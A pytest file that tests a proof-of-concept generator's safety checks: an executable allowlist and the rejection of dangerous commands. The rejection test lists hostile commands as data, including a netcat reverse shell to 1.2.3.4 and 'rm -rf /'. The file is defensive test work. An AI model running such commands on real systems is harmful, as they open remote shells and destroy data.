import pytest

from core.reporting.poc_generator import PoCGenerator, PoCSafetyError


def test_poc_allowlist_only():
    g = PoCGenerator()
    finding = {
        "id": "f1",
        "type": "http_service",
        "host": "example.com",
        "port": 80,
        "scheme": "http",
        "path": "/",
        "risk": "info",
    }
    artifact = g.generate_for_finding(finding)
    assert artifact.safe is True
    assert artifact.commands
    for cmd in artifact.commands:
        exe = cmd.split(" ", 1)[0]
        assert exe in g._ALLOW_CMDS  # intentional: enforce allowlist


@pytest.mark.parametrize(
    "bad_cmd",
    [
        "bash -c whoami",
        "curl -X POST http://example.com/",
        "curl --data a=b http://example.com/",
        "nmap --script vuln example.com",
        "nc -e /bin/sh 1.2.3.4 4444",
        "python3 -c 'print(1)'",
        "rm -rf /",
    ],
)
def test_poc_blocks_dangerous_patterns(bad_cmd):
    g = PoCGenerator()
    with pytest.raises(PoCSafetyError):
        g._assert_safe_command(bad_cmd)
